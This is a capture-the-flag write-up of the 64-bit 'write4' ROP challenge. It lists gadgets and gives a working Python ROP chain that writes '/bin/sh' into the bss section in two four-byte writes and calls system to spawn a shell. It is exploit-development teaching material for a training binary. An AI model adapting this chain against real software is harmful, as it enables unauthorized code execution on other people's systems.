# write4 - 64 bit
in the previous challanges we had the luxury of not having to craft our own strings as they were in the binary itself.   
this time we are not so lucky.(as you can see, no "cat flag.txt")   
  
![start](https://user-images.githubusercontent.com/60041914/78295574-0670e580-7535-11ea-983a-d7ebbd104b72.png)
  
we are tasked with writing our string to some memory address, setting edi to that address and jumping to system in the PLT.   
(for some backround info feel free to check out some of my writeups for the previous challanges in the series)
   
using ROPgadget we find some interesting gadgets:   
```nasm
0x0000000000400821 : mov dword ptr [rsi], edi , ret
0x0000000000400893 : pop rdi , ret
0x0000000000400891 : pop rsi , pop r15 , ret
```
"pop rdi , ret" could be used to set rdi.  
     
"pop rsi , pop r15 , ret" could be used to set rsi.    
(and r15 to some garbage value as it is unimportant) 
    
"mov dword ptr [rsi], edi , ret" writes the value of edi to the memory pointed to by rsi.  
    
so we have an arbitrary write. 
we just have to find somewhere to write to.
    
I chose someplace in the bss section as it is both readable and writeable.

having a second look at the gadgets I chose you might notice another thing:    
we can only write to memory 4 bytes at a time (edi-32 bits)    
because our desired string is 8 bytes ("/bin/sh\x00" ) we will need to preform 2 writes.   
   
knowing that we can now craft a ROP chain:
```python
STR_ADDR=0x006010b0
CALL_SYSTEM=0x004005e0
SET_RDI=0x00400893
SET_RSI=0x00400891
RDI_TO_pRSI=0x00400821

exploit=b'A'*40
exploit+=p64(SET_RSI)
exploit+=p64(STR_ADDR) # set rsi to the desired address
exploit+=p64(0x41414141) # r15 to a garbage value
exploit+=p64(SET_RDI)
exploit+=b"/bin\x00\x00\x00\x00" # set rdi to start of our string (with padding zeros)
exploit+=p64(RDI_TO_pRSI) # write memory
exploit+=p64(SET_RDI)
exploit+=b"/sh\x00\x00\x00\x00\x00" # set rdi to the end of our string
exploit+=p64(SET_RSI)
exploit+=p64(STR_ADDR+4) # place our string after the 4th character written
exploit+=p64(0x41414141) # r15 to a garbage value
exploit+=p64(RDI_TO_pRSI) # preform another write
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR) # set rdi to point to our string
exploit+=p64(CALL_SYSTEM) #call system
```

pass it to our program.  
and...   
pwned.   
  
![pwned](https://user-images.githubusercontent.com/60041914/78295569-0375f500-7535-11ea-9a04-5bd70e08cee5.png)
